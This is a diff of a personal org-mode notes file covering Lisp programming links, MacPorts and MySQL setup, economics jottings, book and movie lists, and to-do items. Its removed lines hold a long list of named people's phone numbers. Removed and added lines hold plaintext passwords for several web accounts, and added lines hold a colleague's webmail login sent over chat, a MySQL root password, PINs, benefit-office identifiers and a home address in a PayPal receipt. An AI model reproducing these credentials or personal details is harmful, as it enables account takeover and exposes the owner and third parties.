@@ -1,260 +1,55 @@
 -*- mode:org; coding:utf-8 -*-
+* NOTES
+** Economy: Économie:
 
+Capital productif:
+- travail pour produire l'ensemble des moyens de production représentés par ce capital.
 
+Coût économique du capital productif:
+- travail pour maintenir les moyens de production.
 
-ℂℍℕℙℚℝℤℼℽℾℿ⅀ⅅⅆⅇⅈⅉ
-TODO: add link http://www-formal.stanford.edu/jmc/recursive.pdf to aim-8.html
+Coût financier du capital productif:
+- endettement (dividendes, intérêts) pour acheter les moyens de production.
 
-(alexandria:hash-table-alist asdf/source-registry::*source-registry*)
+(= (* masse-monétaire vitesse-circulation-monnaie)
+   (* quantités-vendues prix))
 
-coinbase|pjb@informatimago.com|byWi-fYSXocWiD]kid
+*** Economic Freedom:
+http://www.freetheworld.com/
+http://www.heritage.org/        2003 Index of Economic Freedom
+http://www.heritage.org/research/features/index/
 
-http://www.digitalcombatsimulator.com/|pjb@informatimago.com|FUKekij2solryj
+** Cinefin Framework
 
+Simple:  cause -> effect
+Complicated: cause -> -> -> effect
+Complex: cause? effect
+Chaotic: effect? cause?
+Disorder: 
 
-http://www.artinfo-musinfo.org/en/issues/index.html
+** Ubudu
 
+uBeacon: F2A74FC4-7625-44DB-9B08-CB7E130B2029 12300 12310
+(same as Krystof)
 
-http://allopetitdejeuner.com
-http://chaussettesclub.com
+** Livres à acheter
+**** Petite histoire de l'expérimentation démocratique                  :buy:
+Yves Sintomer
+Petite histoire de l'expérimentation démocratique
+Tirage au sort et politique d'Athênes à nos jours
+ 
+**** Valentina: Soul in Sapphire                                        :buy:
+**** Esercizi di costruzioni elettromeccaniche (Vaske Paul, Riggert Johann H.) :buy:
+ 
+Esercizi di costruzioni elettromeccaniche
+Autore: Vaske Paul, Riggert Johann H.
+ISBN-10: 8820707020
+ISBN-13: 9788820707026
+ID prodotto: EPID49446951
 
-http://changement-adresse.gouv.fr
-http://actes-etat-civil.fr
-http://telepoint.info               (demande préalable en prefecture)
-http://mon.service-public.fr
-https://www.amendes.gouv.fr        (amende minorée dans les trois jours, sauf stationnement et >= 750 euro)
-http://montimbreamoi.com            (imprimer un timbre personnalisé)
-http://montimbreenligne.laposte.fr  (imprimer un timbre)
-http://lettreenligne.laposte.fr     (envoyer un PDF en recommendé)
-http://amelie.fr
-
-http://fdj.fr
-http://pmu.fr
-
-http://chauddevant.com
-http://voirunfilm.com
-http://books.google.fr
-http://gutenberg.org
-http://livrespourtous.com
-
-
-
-https://www.youtube.com/watch?v=QJ475rdA3sU  Effraction 1982
-
-https://en.wikipedia.org/wiki/Igor_Engraver
-
-https://github.com/GitoriousLispBackup/lisp-1-5
-https://github.com/informatimago/lisp-1-5
-
-http://ubuntuparty.org.za
-
-(asdf:already-loaded-systems)
-
-http://www.cnx-software.com/2015/02/02/oneboard-pro-plus-android-keyboard/
-
-http://www.techrepublic.com/article/an-app-that-passively-records-your-life-so-you-always-have-a-witness/
-
-hello kitty:           http://tinyurl.com/oh7laeh
-DON'T FEED THE TROLL:  http://www.timesonline.co.uk/multimedia/archive/00377/Travel_Silly_Signs__377652a.jpg
-
-http://asciiwwdc.com 
-http://dspace.mit.edu/handle/1721.1/41992
-http://home.pipeline.com/~hbaker1/ShallowBinding.html
-http://www.interstellarmovie.com/adventure/
-http://www.maclisp.info/pitmanual/master-index-s.html
-
-* phone
-
-Agathe De Robert|+34679451950
-Alain Bourguignon|+33296703498
-Alain Bourguignon|+33620255649
-Alain Bourguignon|+33661765866
-Alberto Sole|+33961318677
-Alberto Sole|+34661645897
-Alberto Sole|+34961318677
-Alberto Sole|961318677
-Alexander Nazarenko|+3752926322002
-Alexis Bosch|+33652247248
-Alexis Bosch|+33950261348
-Alexis Bosch|+33951870196
-Alexis Bosch|0950261348
-Alexis Bosch|0951870196
-Alexis Delattre|+33699089245
-Alexis de Lattre|+33699089245
-Ali Alsaleh|+966506814613
-Anaïs Nouvet|+336463407101
-André Reinald|+33177695665
-André Reinald|+33652452554
-André Reinald|+33950669403
-André Thieme|+4915117897070
-André Thieme|+491717008954
-Anevia|+33141983240
-Angelo Rossi|+393293516963
-Antoine Engster|+447921801319
-Antoine Engster|00447921801319
-Arnaud Decherf|+33148241482
-Arnaud Decherf|0148241482
-BNP|+33141460409
-BNP|0141460409
-Bastien Guerry|+33666683436
-Bastien Guerry|0666683436
-Benzaquen|+33141927190
-Bernard Bourguignon|+33296701636
-Bettina Barth|+34616439816
-Bnp Issy Ouest|+33141460404
-Bnp Issy Ouest|0141460404
-Brieuc Jeunhomme|+33630768196
-Bruno Bawol|+33602223522
-Bruno Bawol|+33674881116
-Bruno Bawol|0602223522
-Bruno Bawol|0674881116
-Bus ALSA|+34902422242
-Bus ALSA|5567
-Bus Cartagena|+34968505656
-Bus Gg|+34968291911
-Bus Murcia|+34968292211
-Cajamar Tarjeta|+34901511000
-Camille Saubot|+34625983508
-Camille Saubot|+34646240085
-Camille Saubot|+34968556691
-Camille Saubot|0034625983508
-Camille Saubot|0034968556691
-Carlos|+34968337046
-Celestino Conesa|+34968569225
-Chloe Scheuber|0121631587507833050284
-Christiane Chilkowy|+33329665297
-Christiane Chilkowy|+33785017461
-Colin Carr, CSM|9193356889
-Dan Lentz|6092025797
-Dany CHAN|+33633297776
-Dave Azria|+33611080810
-David Boukari|+33661223446
-David Braquart|+33139143477
-De Robert|+34968146250
-Dr Karen Choukroun|+33146422562
-Dr Karen Choukroun|0146422562
-Eric Gharbi|+33658365309
-Eric Gharbi|0658365309
-Erman Kaya|+905413232784
-Famille De Robert|+34968146250
-Fernando Rodriguez|+34610965332
-Florent Xuereb|+33683728168
-Florent Xuereb|0683728168
-Franck Poullain|+33631789378
-François Alter|+33153442252
-François Kruta|+33614519206
-François Kruta|+33659098436
-Frédéric Colomina|+33672569797
-Frédérique Saubot|+33145030179
-Frédérique Saubot|+33145049621
-Frédérique Saubot|+33682948109
-Gabriel De Robert|+34646111756
-Gharbi Eric|+33658365309
-Gharbi Eric|0658365309
-Grégoire Saubot|+33674915872
-Guillaume De Robert|+34626540903
-Guillaume De Robert|+34649357740
-Guillaume De Robert|+34968137376
-Gábor Melis|+36303076507
-Henry Saubot|+33682316575
-Ilker Yenice|+905305172121
-Impot|+33820326326
-Info services|7000
-Info. Internac|11825
-Info. Nacional|11822
-Isabel Aznar Acosta|+34649509902
-JAIME FIOL SANS|+33610799801
-JAIME FIOL SANS|+33669269760
-JAIME FIOL SANS|610799801
-JAIME FIOL SANS|669269760
-Jason Cornez|+34607217161
-Jean-Baptiste Quesney|+33676671665
-Jean-Philippe Capy|+33604016157
-Jean-Philippe Capy|+33950666678
-Jerome Goubier|+971508831129
-Jimmy Nimo|00353000000000
-Jonathan Bouaziz|+33782480616
-Jonathan Bouaziz|0782480616
-Jose Luis Cruz Cañete|+34655666353
-Jose Luis Cruz Cañete|0034655666353
-Jose Manual Urtasun|+34699370494
-Jose Manual Urtasun|+34968563054
-Joseph Reinald|+33613291911
-José Manuel Sánchez Ruiz|+33639650090
-José Manuel Sánchez Ruiz|639650090
-Joëlle Bourguignon|+33672415839
-Levente Mészáros|+36205413889
-Lionel Bringuier|+15032008809
-Lionel Bringuier|+33603611970
-Lionel Thevenard|+33616774371
-Malik Jamali|+33616678471
-Malik Jamali|0616678471
-Mano Sadeghi|+33603234411
-Mano Sadeghi|0603234411
-Mariusz Saramak|+33792016612
-Mariusz Saramak|792016612
-Martin LUTTON|+33175435370
-Martin LUTTON|0175435370
-Martin Lutton|+33678414402
-Martin Lutton|0678414402
-Misha Tavkhelidze|+995599000313
-Mon Compte|963
-Mélanie Rousseau|+33778511321
-Nicoleta Reinald|+33627194908
-Olivier Revon|+33689638439
-Pascal J. Bourguignon|+33623171770
-Pascal J. Bourguignon|+33781556432
-Patricia Guitard|+33663712299
-Patricia Guitard|0663712299
-Patrick MIMOUN|+33760485614
-Patrick MIMOUN|0760485614
-Paul Le Merrer|+33668542601
-Pierpaolo Bernardi|+393924459291
-Pierre-Yves Reynaert|+33619190274
-Ramón Burgueńo|+34676087136
-Recruteur Ios|+33659640699
-Recruteur Ios|0659640699
-Rogelio Serrano|+447624429872
-Répondeur|123
-Slobodan Blazeski|+38971281646
-Séverine Verriez|+33670803977
-Thomas Chauchard|+33619984611
-Thomas Haas|+436641140862
-Thomas M. Hermann|3162850120
-Thomas Saphir|+33616885760
-Tommy Lee Zet|+33604506105
-Tommy Lee Zet|604506105
-Ubudu Project Beacon|+33178090351
-Vicyor Minuesa Cuenca|+34629402487
-Vincente De Robert|+34690010607
-
-* samba linux -> macosx
-
-The trick is not to give a path to mount, but the name of a "share":
-mount --verbose -t cifs -o pass=${pass},user=pjb,uid=1000,gid=1000,nounix,sec=ntlmssp,noperm,rw '//larissa/Test' /mnt/p
-
-* hemlock
-
-<phf> akkad: i have two dwim functions in my config, one is "Indent and Expand" that i
-bind to <tab>. might be handy re "any tab completion for function
-names?". http://paste.lisp.org/display/145376
-   *** gz (sid27187@gateway/web/irccloud.com/x-uctykdnbobrhfamj) has joined channel #ccl
-<phf> i tried adding objective c method completion, but without context analysis it became
-unruly fast
-   *** alms____ (sid27381@gateway/web/irccloud.com/x-lwbkdavcyduuzdee) has joined channel #ccl
-<phf> this document http://common-lisp.net/project/cmucl/doc/hemlock-user.ps.gz is still
-very useful if you're doing basic ide customizations
-<phf> erm, command implementor's manual, rather
-http://common-lisp.net/project/cmucl/doc/hemlock-cim.ps.gz
-
-
-<pjb> studentz: do not use implementation specific packages.  Use (asdf:run-shell-command
-"dot  -Tps -O fname")
-   *** monod (~monod@host52-6-dynamic.40-79-r.retail.telecomitalia.it) has joined channel #lispcafe
-<|3b|> pjb: documentation/comments on that function say not to use it, use
-uiop:run-program instead
-
-* Ploncard d'Assac
+http://www.unilibro.it/libro/vaske-paul-riggert-johann-h-/esercizi-costruzioni-elettromeccaniche/9788820707026
+ 
+**** Ploncard d'Assac                                                   :buy:
 
  30?   L'église occupée
  30    1792 Les dernières marches du trône
@@ -277,14 +72,52 @@ uiop:run-program instead
 ---
 370
 
-* larissa
- Remember to set the environment variable GRADLE_HOME to the path to
- the gradle distribution: /opt/local/share/java/gradle
+** CNIL
+https://groupes.renater.fr/droit-net/fom-serve/cache/49.html
+** GOLD
+2009/04/01 napoleons 20F   10 * 145.00  = 1450.00
+2012/09/06 napoleons 20F    6 * 245.00  = 1470.00 
+2012/10/04 napoleons 20F    7 * 249.00  = 1743.00
+(/ 245.0 145.0) = 69%/3 ans  = 19%/an
 
-Apple X11.app:    defaults write org.x.X11 enable_test_extensions -boolean true 
-MacPorts X11.app: defaults write org.macports.X11 enable_test_extensions -boolean true 
+2013/06/05 napoleons 20F    6 * 210.00  = 1260.00
 
-* Notes
+
+We may yet see a bubble in the US into 2015.75 if we in fact see the
+dollar RISE as did the yen going into 1989. A rising dollar will
+increase the profits for foreign investors and draw in even more
+capital globally creating massive capital concentration and global
+civil unrest. The Fed will go nuts and be forced to raise interest
+rates fearing a bubble and that will blow out the deficits and the
+entire system will collapse 2016-2020. So hold on to your socks. This
+is likely to be a wild ride.
+
+** Pole Emploi
+
+Pour valider votre demande d'inscription à Pôle Emploi, vous devez
+choisir un rendez-vous avec un conseiller.  Vendredi 11 Avril 2014,
+09h50
+
+Vous serez reçu(e), durant une heure environ, par un conseiller
+spécialisé dans l’accompagnement des cadres au Pôle emploi suivant :
+
+    USP Cadres issy-les-moulineaux
+    19-21 BD GAMBETTA
+    92130 ISSY LES MOULINEAUX
+
+(Attention, votre inscription ne sera effective que si vous vous
+présentez à ce rendez-vous obligatoire)
+
+*** Pole Emploi - references
+6093514E
+649084
+92130
+
+3760303L
+641700
+93310
+
+** Notes 1
 - test and compare, expansion of all CL macros in all implementation for all optimization levels.
   find if expansions use implementation specific features.
 
@@ -347,52 +180,7 @@ https://vimeo.com/82301919
 Il faut reprendre le pouvoir démocratique :  http://le-message.org/  http://www.upr.fr/﻿
 "La Révolution Européenne"
 
-* Économie
-
-Capital productif:
-- travail pour produire l'ensemble des moyens de production représentés par ce capital.
-
-Coût économique du capital productif:
-- travail pour maintenir les moyens de production.
-
-Coût financier du capital productif:
-- endettement (dividendes, intérêts) pour acheter les moyens de production.
-
-** Economic Freedom:
-http://www.freetheworld.com/
-http://www.heritage.org/        2003 Index of Economic Freedom
-http://www.heritage.org/research/features/index/
-
-* Acheté
-** Laurent LOUIS
-Votre paiement a été effectué.
-
-Le numéro de transaction pour ce paiement est le suivant : 66X52110TD680102S.
-Nous enverrons un email de confirmation à pjb+paypal-fr@informatimago.com. Cette transaction apparaîtra sur votre relevé de carte sous l'intitulé PayPal *LAURENTLOUI.
-
-Vous venez d'effectuer un paiement de
-€29,45 EUR
-
-Payé à
-Laurent LOUIS
-paiement@deboutlesbelges.be
-0477595068
-Adresse de livraison
-Pascal Bourguignon
-37, rue Rouget de Lisle
-Appartement 210
-92130 Issy les Moulineaux 
-France
-
-* Cinefin Framework
-
-Simple:  cause -> effect
-Complicated: cause -> -> -> effect
-Complex: cause? effect
-Chaotic: effect? cause?
-Disorder: 
-
-* NOTES
+** NOTES 2
 
 beach: about the first HIR example.  I assume you consider that the
 open-coding allowed for CL operators would be implemented _before_
@@ -474,35 +262,7 @@ http://www.yegor256.com/2014/04/27/typical-mistakes-in-java-code.html
 0785017461 christiane
 http://www.naturallivingideas.com/17-foods-to-buy-once-and-regrow-forever/
 
-* Ubudu
-
-uBeacon: F2A74FC4-7625-44DB-9B08-CB7E130B2029 12300 12310
-(same as Krystof)
-
-* Pole Emploi
-
-Pour valider votre demande d'inscription à Pôle Emploi, vous devez choisir un rendez-vous avec un conseiller.
-Vendredi 11 Avril 2014, 09h50
-
-Vous serez reçu(e), durant une heure environ, par un conseiller spécialisé dans l’accompagnement des cadres au Pôle emploi suivant :
-
-    USP Cadres issy-les-moulineaux
-    19-21 BD GAMBETTA
-    92130 ISSY LES MOULINEAUX
-
-(Attention, votre inscription ne sera effective que si vous vous présentez à ce rendez-vous obligatoire)
-
-* AirBook:
-
-- X Plane
-- Android
-+ Trainz
-+ Cathode
-+ Clozure CL
-+ Xcode
-+ macport
-
-* NOTES
+** NOTES 3
 http://darling.dolezel.info/en/Darling
 
 
@@ -535,23 +295,6 @@ https://dionyziz.com/oath/
 https://github.com/sabof/svg-thing.git
 http://www.theatlantic.com/magazine/archive/2013/11/the-man-who-would-teach-machines-to-think/309529/?curator=MediaREDEF
 
-** Livres à acheter
-*** Petite histoire de l'expérimentation démocratique                   :buy:
-Yves Sintomer
-Petite histoire de l'expérimentation démocratique
-Tirage au sort et politique d'Athênes à nos jours
- 
-*** Valentina: Soul in Sapphire                                         :buy:
-*** Esercizi di costruzioni elettromeccaniche (Vaske Paul, Riggert Johann H.) :buy:
- 
-Esercizi di costruzioni elettromeccaniche
-Autore: Vaske Paul, Riggert Johann H.
-ISBN-10: 8820707020
-ISBN-13: 9788820707026
-ID prodotto: EPID49446951
-
-http://www.unilibro.it/libro/vaske-paul-riggert-johann-h-/esercizi-costruzioni-elettromeccaniche/9788820707026
- 
 ** misc
 
 mailbox.org
@@ -690,7 +433,7 @@ missing: page 132 135 136
 
 maillists: cmucl*@cmucl.cons.org
 
-* NOTES
+** NOTES 4
 http://www.omg.org/spec/index.htm
 
 (setf w3m-cookies nil)
@@ -736,7 +479,7 @@ b. FP invades the mainstream list http://blog.languager.org/2013/06/functional-p
 
 http://osrc.dfm.io/
 
-* NOTES
+** NOTES 5
 
 pascal.bourguignon03@orange.fr|7cxha2v
 bolet75@live.com
@@ -872,9 +615,7 @@ pin reseau 6584 # free?  sfr data?
 
 https://github.com/abrausch/coursera-downloader
 
-* NOTES
-** CNIL
-https://groupes.renater.fr/droit-net/fom-serve/cache/49.html
+** NOTES 6
 ** Other notes
 *** La Manga del Mar Menor
 
@@ -1186,23 +927,255 @@ Movistar 340761 000326 5209 0   636653318   20110509
 
 http://www.progweb.com/modules/blackberry/index-en.html
 
-** GOLD
-2009/04/01 napoleons 20F   10 * 145.00  = 1450.00
-2012/09/06 napoleons 20F    6 * 245.00  = 1470.00 
-2012/10/04 napoleons 20F    7 * 249.00  = 1743.00
-(/ 245.0 145.0) = 69%/3 ans  = 19%/an
+** NOTES 7
 
-2013/06/05 napoleons 20F    6 * 210.00  = 1260.00
+http://kukuruku.co/hub/programming/do-not-wake-the-programmer
+http://theanarchistlibrary.org/library/l-susan-brown-does-work-really-work
+http://www.karlmarx.fr/
+
+http://sourceforge.net/|informatimago/RypvUx5GAJSYjiNOn2
 
 
-We may yet see a bubble in the US into 2015.75 if we in fact see the
-dollar RISE as did the yen going into 1989. A rising dollar will
-increase the profits for foreign investors and draw in even more
-capital globally creating massive capital concentration and global
-civil unrest. The Fed will go nuts and be forced to raise interest
-rates fearing a bubble and that will blow out the deficits and the
-entire system will collapse 2016-2020. So hold on to your socks. This
-is likely to be a wild ride.
+
+flying eagle: https://www.youtube.com/watch?v=QwNc0SFIp-o
+student OS writing: http://xosnitc.github.io/index.html
+
+
+rsync@android:
+ssh-dss AAAAB3NzaC1kc3MAAACBAIgVn7s7FffdhrCIqVCrihXhvgtlMOaTqrSbcJxCPx8M6oOv0BJDgserlSIcxIBawPwmhMq4kzrp/PCQXzx0+fc9SdIpz6Cj5SL/m6NCh6E+OcLeYk7Y6BkSFpS3dF8X+KVc9bg9N/8s20H7ao4VSCWE+2uUnlG2vhk0gLfjAI4ZAAAAFQCxvWRpfeVYKAjZVd7I9e3asMi5eQAAAIB/NfcCTpWuiKyqM50DPWI+L/y9QaHnYIJ9GctwSIDj5tjQI2CpmHau3e1gEx5LHdtn1aV3Lh1HswTi3ndKZmE+sqrUPQTzEsnNEhwAqu8XwMGrpByT6T8wT64szFb4EMwYxjFQQXXgkXGmpk5IKnvYLz+9FV6qZMuIqkcZYEEvbAAAAIAdqNmsd9SIXzJw5IYjnwdBxEsNmee83A8+/jxL+1rVxk4WErnwE1W/dnIubuM8WtzhLsLfsamIUnW2IDrtbrKsXGZ1Pc33d1P8bURPIPVH7N9C41KhHq6ueuiwDr+VZEm7kU2LKlIm75X1/ehn1kC//zecUS3wwlZ4IgEy62ZjvQ== rsync@android
+
+
+
+Alan Kay "Programming and Scaling" 2011
+http://www.tele-task.de/archive/video/flash/14029/
+https://www.youtube.com/watch?v=gZmcmdsoAXU
+https://www.youtube.com/watch?v=-UOmItPa4iA
+https://www.youtube.com/watch?v=QlPavndhYxQ
+https://www.youtube.com/watch?v=y9xLi0iJg1g
+https://vimeo.com/82301919
+
+Alan Kay iPad question:
+https://youtu.be/ubaX1Smg6pY?list=PLKuVC3Lrr0b8k5UY402FfM2LuZ8Ecti96&t=5077
+
+
+
+
+http://www.ina.fr/video/CPF86648057/informatique-generale-video.html
+http://webtubes.free.fr/ortf/articles.php?pg=art58
+
+
+IPv6: RFC3177 RFC4193
+
+
+code des impots 1346 article 78
+msa.fr -> cotisant de solidarité
+
+
+
+robert.strandh@gmail.com idurand@labri.fr
+
+beach    https://github.com/robert-strandh/dpANS-parser
+eudoxia  https://github.com/eudoxia0/cl-ansi-spec
+
+
+ProgOnline Jacob Amar 0175430503 
+
+*** debian 8
+systemctl status movies-swap.swap
+
+*** port
+export GRADLE_HOME=/opt/local/share/java/gradle
+sudo port select --set maven maven3
+
+port select --set pip pip27
+port select --set pip pip33
+port select --set pip pip34
+port select --set cython cython27
+port select --set cython cython34
+
+
+If this is a new install you might want to run:
+$ sudo -u _mysql /opt/local/lib/mysql56/bin/mysql_install_db
+
+
+sudo port install port_cutleaves 
+sudo port_cutleaves 
+sudo port upgrade outdated 
+sudo port clean --all installed
+sudo port uninstall mysql5-server 
+sudo port uninstall mysql5
+sudo port install mysql56 
+sudo port list select mysql56 mysql56 @5.6.21 databases/mysql56
+
+
+Apple X11.app:    defaults write org.x.X11        enable_test_extensions -boolean true 
+MacPorts X11.app: defaults write org.macports.X11 enable_test_extensions -boolean true 
+defaults read  org.macports.X11 enable_test_extensions
+defaults read  org.x.X11        enable_test_extensions
+
+*** Mysql
+
+To start mysqld at boot time you have to copy
+support-files/mysql.server to the right place for your system
+
+PLEASE REMEMBER TO SET A PASSWORD FOR THE MySQL root USER !
+To do so, start the server, then issue the following commands:
+
+TiJE5to
+
+  /opt/local/lib/mysql56/bin/mysqladmin -u root password 'TiJE5to'
+  /opt/local/lib/mysql56/bin/mysqladmin -u root -h larissa.local password 'TiJE5to'
+
+Alternatively you can run:
+
+  /opt/local/lib/mysql56/bin/mysql_secure_installation
+
+which will also give you the option of removing the test
+databases and anonymous user created by default.  This is
+strongly recommended for production servers.
+
+See the manual for more instructions.
+
+You can start the MySQL daemon with:
+
+  cd /opt/local ; /opt/local/lib/mysql56/bin/mysqld_safe &
+
+You can test the MySQL daemon with mysql-test-run.pl
+
+  cd mysql-test ; perl mysql-test-run.pl
+
+Please report any problems at http://bugs.mysql.com/
+
+The latest information about MySQL is available on the web at
+
+  http://www.mysql.com
+
+Support MySQL by buying support/licenses at http://shop.mysql.com
+
+WARNING: Could not copy config file template /opt/local/share/mysql56/support-files/my-default.cnf to
+/opt/local/etc/mysql56/my-new.cnf, may not have access rights to do so.
+You may want to copy the file manually, or create your own,
+it will then be used by default by the server when you start it.
+
+*** port: Installing ECL on MacOSX Yosemite
+http://stackoverflow.com/questions/27976312/how-to-cope-with-non-gcc-compatible-code-in-os-x-yosemite-core-headers/28014302#28014302
+
+> port install ecl
+
+fails like this when using a gcc version < 5.
+You can switch to gcc5:
+
+>    port install gcc5
+>    port select gcc mp-gcc5
+>    port install ecl
+
+(but then, it looks like gcc5 can't compile mit-scheme, so you may have to switch back to gcc49 for mit-scheme.
+
+** NOTES 8
+*** Alexis
+Carole Sagon 
+Karim Haddad
+
+*** BNP
+
+BNP 
+conseiller 
+M. Thomas Noel
+M. Fauroux
+0141460409
+
+*** SFR
+
+sfr web pin=6599
+
+*** Orange
+
+Orange fibre: my phone number: +33966872199
+
+*** Comptes
+voyage-sncf.fr|pjb@informatimago.com|manonVoyage
+cloudmagic.com|pjb@informatimago.com|cAty-bar8
+
+www.godaddy.com
+1898145/informatimago/ecsvRWUv
+
+www.domainedesnoms.com
+compte DDN:  14012-DDN / 1e12neurons
+
+http://pole-emploi.fr|9093514E|649084|92130
+
+[27/07/15 18:35:59] Angelo Rossi: http://webmail.af-engineering.it/
+[27/07/15 18:36:25] Angelo Rossi: user: pascal.bourguignon
+[27/07/15 18:36:33] Angelo Rossi: password: P4sc4l#64
+pascal.bourguignon@af-engineering.it
+
+e2506005030
+delphine.capy@malix.univ-paris1.fr
+1413040195Dc
+Paris 1 Interactif
+
+** NOTES 9
+
+ℂℍℕℙℚℝℤℼℽℾℿ⅀ⅅⅆⅇⅈⅉ
+TODO: add link http://www-formal.stanford.edu/jmc/recursive.pdf to aim-8.html
+
+(alexandria:hash-table-alist asdf/source-registry::*source-registry*)
+
+coinbase|pjb@informatimago.com|byWi-fYSXocWiD]kid
+
+http://www.digitalcombatsimulator.com/|pjb@informatimago.com|FUKekij2solryj
+
+
+http://www.artinfo-musinfo.org/en/issues/index.html
+
+
+http://allopetitdejeuner.com
+http://chaussettesclub.com
+
+http://changement-adresse.gouv.fr
+http://actes-etat-civil.fr
+http://telepoint.info               (demande préalable en prefecture)
+http://mon.service-public.fr
+https://www.amendes.gouv.fr        (amende minorée dans les trois jours, sauf stationnement et >= 750 euro)
+http://montimbreamoi.com            (imprimer un timbre personnalisé)
+http://montimbreenligne.laposte.fr  (imprimer un timbre)
+http://lettreenligne.laposte.fr     (envoyer un PDF en recommendé)
+http://amelie.fr
+
+http://fdj.fr
+http://pmu.fr
+
+http://chauddevant.com
+http://voirunfilm.com
+http://books.google.fr
+http://gutenberg.org
+http://livrespourtous.com
+
+
+
+https://www.youtube.com/watch?v=QJ475rdA3sU  Effraction 1982
+
+https://en.wikipedia.org/wiki/Igor_Engraver
+
+https://github.com/GitoriousLispBackup/lisp-1-5
+https://github.com/informatimago/lisp-1-5
+
+http://ubuntuparty.org.za
+
+(asdf:already-loaded-systems)
+
+http://www.cnx-software.com/2015/02/02/oneboard-pro-plus-android-keyboard/
+
+http://www.techrepublic.com/article/an-app-that-passively-records-your-life-so-you-always-have-a-witness/
+
+hello kitty:           http://tinyurl.com/oh7laeh
+DON'T FEED THE TROLL:  http://www.timesonline.co.uk/multimedia/archive/00377/Travel_Silly_Signs__377652a.jpg
+
+http://asciiwwdc.com 
+http://dspace.mit.edu/handle/1721.1/41992
+http://home.pipeline.com/~hbaker1/ShallowBinding.html
+http://www.interstellarmovie.com/adventure/
+http://www.maclisp.info/pitmanual/master-index-s.html
 
 * ACTIONS
 ** Miscellaenous TO DO
@@ -1235,6 +1208,8 @@ Harlequin Common Lisp (LispWorks was the IDE)
 **** TODO [#A] update profile on etc…
 **** TODO [#A] update CV on pjb.ogamita.org
 **** TODO [#A] update CV on Monster.com
+http://beknown.com/pascal-bourguignon
+
 **** TODO [#A] update CV on pole-emploi.fr
 **** TODO [#A] Redesign my résumé / cv:
    + different facettes of PJB: { {C/C++ track, Lisp track, ...},
@@ -1277,6 +1252,44 @@ Harlequin Common Lisp (LispWorks was the IDE)
     - State "DONE"       from "TODO"       [2014-11-05 Wed 01:06] \\
       Done. Paid.
 ** Developments TO DO
+*** TODO cd /Users/pjb/src/mocl ; make mocl-test
+*** TODO [#A] debug Patchwork and produce a release
+
+https://github.com/informatimago/mclgui/graphs/code-frequency
+https://github.com/informatimago/patchwork/graphs/code-frequency
+
+*** TODO [#B] implement OPS minispecs
+*** TODO [#B] implement Manif 
+**** TODO [#B] the Server
+**** TODO [#B] on iOS 
+**** TODO [#B] on Android
+*** TODO cl-stepper generation of backtraces / lisp debugger API
+*** TODO [#C] 2x SanDisk Extreme PRO® SDHC™/SDXC™ UHS-I Memory Card      :buy:
+http://www.dpreview.com/articles/5813601559/sandisk-unveils-512gb-extreme-pro-sdxc-uhs-i-card
+
+volume of a sdcard = 1612.8 mm³
+volume of a shoebox = (* 300 200 100) = 6000000 mm³
+(/ (* 300 200 100) 1612.8) = 3720 sdcard/shoebox.
+(* 3720 800) $2,976,000.00 @shoebox.
+sdcard   $2,976,000.00 @shoebox.
+platinum $5,188,803.00 @shoebox.
+
+(sort (loop
+        with vol-m3 = (* 0.300 0.200 0.100)
+        for (metal price/oz density-kg/m3) in '((gold 1236 19300)
+                                                (platinum 1254 21450)
+                                                (palladium 784 12023)
+                                                (rhodium 1190 12410)
+                                                (osmium 400 22588))
+        for price/kg = (* price/oz 32.1507466)
+        collect (list metal (round (* price/kg vol-m3 density-kg/m3))))
+      (lambda (a b) (< (second a) (second b))))
+((osmium 1742931)
+ (palladium 1818324)
+ (rhodium 2848794)
+ (gold 4601698)
+ (platinum 5188803))
+
 *** TODO [#A] mocl test 2 (ios/android).
 *** TODO [#A] Application mobiles (iOS, Android): comptage de manifestation + geolocation.
 *** TODO [#B] Application mobiles (iOS, Android): geofamily-like but free.
@@ -1537,6 +1550,33 @@ Year   Infl.Corr/Year   Total Remaining
 2026:        34.510,41        71.091,44
 2027:        36.581,03        36.581,03
 ----   ---------------  ---------------
+
+*** Movies
+
+Eyes Wide Shut
+Les Sentiers de la gloire
+Orange Mecanique
+2001 l'Odyssée de l'espace
+Lolita
+Shining
+Barry Lindon
+Full Meta Jacket
+Docteur Folamour
+The Dark Knight, Christopher Nolan
+Le Juif Süss, Veit Harlan
+Rosemary's Baby, Roman Polanski
+Room 237, Rodney Ascher
+Mandchurian Candidate, John Frankenheimer
+Complot, Richard Donner
+Shutter Island, Martin Scorsese
+Manhatan Man, John Schlesinger
+A.I Intelligence Artificielle, Steven Spielberg
+Alice au pays des merveilles, Clyde Geronimi
+Le Magicien d'Oz, Victor Fleming
+Blow Out, Brian de Palma
+
+The Adventures of Bill and John
+Bill et John Ep II Danger Attacks at Dawn - 2006
 
 *** ALIRE, LECTURES
 
@@ -2350,6 +2390,26 @@ http://www.newscientist.com/news/news.jsp?id=ns99992066
 **** TODO [#C] warthog hotas                                            :buy:
 ** FAIT, DONE
 *** Achats Achetés
+**** Laurent LOUIS
+Votre paiement a été effectué.
+
+Le numéro de transaction pour ce paiement est le suivant : 66X52110TD680102S.
+Nous enverrons un email de confirmation à pjb+paypal-fr@informatimago.com. Cette transaction apparaîtra sur votre relevé de carte sous l'intitulé PayPal *LAURENTLOUI.
+
+Vous venez d'effectuer un paiement de
+€29,45 EUR
+
+Payé à
+Laurent LOUIS
+paiement@deboutlesbelges.be
+0477595068
+Adresse de livraison
+Pascal Bourguignon
+37, rue Rouget de Lisle
+Appartement 210
+92130 Issy les Moulineaux 
+France
+
 **** DONE [#B] chaise de bureau poid-lourd 200 kg                       :buy:
      CLOSED: [2014-02-17 Mon 03:33]
      - State "DONE"       from "TODO"       [2014-02-17 Mon 03:33] \\
@@ -2554,6 +2614,51 @@ BIC / SWIFT Code..................:      CCRIES2A
        tel: +34 968 569 225
        fax: +34 968 569 127
        tel? +34 968 137 391
+
+*** DONE separate tests from lisp sources
+   CLOSED: [2015-10-18 Sun 12:59]
+   - State "DONE"       from "TODO"       [2015-10-18 Sun 12:59] \\
+     done
+*** DONE [#A] Adhérer à UPR.
+   CLOSED: [2015-04-21 Tue 07:32]
+   - State "DONE"       from "TODO"       [2015-04-21 Tue 07:32]
+
+*** DONE [#A] Resiliation mobile.free
+   CLOSED: [2014-11-01 Sat 17:35]
+   - State "DONE"       from "TODO"       [2014-11-01 Sat 17:35]
+
+Le Contrat entre en vigueur à compter de son acceptation par l’abonné
+et est conclu pour une durée indéterminée. Il est résiliable à tout
+moment par l’abonné ou par Free Mobile moyennant le respect d’un
+préavis de 10 jours à compter de la réception :
+
+- d’une lettre de résiliation envoyée par l’abonné en recommandé avec
+  avis de réception à Free Mobile – Résiliation - 75371 Paris Cedex
